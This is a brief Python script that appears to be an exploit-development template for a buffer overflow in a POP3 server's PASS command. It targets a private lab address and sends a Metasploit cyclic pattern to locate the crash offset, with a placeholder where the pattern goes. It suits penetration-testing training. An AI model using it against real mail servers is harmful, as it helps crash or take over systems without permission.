#!/usr/bin/env python  
import socket  
RHOST = "10.11.12.36"
RPORT = 110 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((RHOST, RPORT))
s.recv(1024) 
lenFromFuzz = 2700 #get this from fuzzing
buf = ''
buf += 1 #paste the result of   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb with fuzzlen here
s.send('USER username' +'\r\n')
s.recv(1024)  
s.send('PASS ' + buf + '\r\n')
